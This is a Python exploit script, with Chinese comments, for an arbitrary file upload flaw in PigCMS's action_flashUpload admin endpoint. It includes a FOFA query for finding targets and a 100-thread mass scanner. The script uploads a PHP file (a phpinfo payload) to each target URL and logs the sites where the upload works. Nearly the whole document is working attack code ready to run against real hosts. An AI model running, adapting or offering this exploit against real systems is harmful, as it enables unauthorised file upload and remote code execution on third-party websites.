#PigCMS action_flashUpload 任意文件上传漏洞

# fofa语法：app="PigCMS"

import re,requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """

______ _       _____ ___  ___ _____ 
| ___ (_)     /  __ \|  \/  |/  ___|
| |_/ /_  __ _| /  \/| .  . |\ `--. 
|  __/| |/ _` | |    | |\/| | `--. \
| |   | | (_| | \__/\| |  | |/\__/ /
\_|   |_|\__, |\____/\_|  |_/\____/ 
          __/ |                     
         |___/                      
                           
"""
    print(test)

def main():
    banner()

    parser = argparse.ArgumentParser(description = "PigCMS action_flashUploade")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")

def poc(target):
    header = {
        'Content-Type': 'multipart/form-data; boundary=----aaa',
        'Content-Length': '139'
    }
    data = '''
    ------aaa
    Content-Disposition: form-data; name="filePath"; filename="test.php"
    Content-Type: video/x-flv

    <?php phpinfo();?>
    ------aaa
    '''
    payload = '/cms/manage/admin.php?m=manage&c=background&a=action_flashUpload'
    url = target+payload
    try:
        res = requests.post(url=url,headers=header,data=data,verify=False,)
        if res.status_code == 302 and "MAIN_URL_ROOT" in res.text:
            print(f"f[+]该url存在任意文件上传漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            print(f"f[-]该url不存在任意文件上传漏洞{target}")
    except Exception:
        print(f"f[*]该url存在问题{target}")
if __name__ == '__main__':
    main()